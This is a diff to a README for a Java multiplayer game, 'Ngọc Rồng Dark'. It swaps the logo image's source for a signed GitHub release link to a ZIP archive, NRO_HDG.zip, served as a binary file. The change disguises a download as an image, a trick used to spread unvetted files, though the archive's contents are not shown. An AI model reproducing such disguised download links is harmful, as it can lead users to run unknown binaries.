@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="https://i.pinimg.com/736x/41/19/12/411912a0598fbae0462b0136c3e978ca.jpg" width="220" alt="Ngọc Rồng Online">
+  <img src="https://release-assets.githubusercontent.com/github-production-release-asset/1180463706/4127c85f-11b3-4966-b968-a434803f6c48?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-19T04%3A18%3A43Z&rscd=attachment%3B+filename%3DNRO_HDG.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-19T03%3A18%3A17Z&ske=2026-04-19T04%3A18%3A43Z&sks=b&skv=2018-11-09&sig=RGTygRVRRZwKP%2BtWmXBFab2diTsFBDXlexwr7Si5L98%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NjU3MjQ0NywibmJmIjoxNzc2NTY4ODQ3LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.72EQhzoibCO3jb2HUX3Yu8020W79f5W8ONPhxNReVT4&response-content-disposition=attachment%3B%20filename%3DNRO_HDG.zip&response-content-type=application%2Foctet-stream" width="220" alt="Ngọc Rồng Online">
 </p>
 
 <h2 align="center">Ngọc Rồng Dark – Java Multiplayer Game</h2>
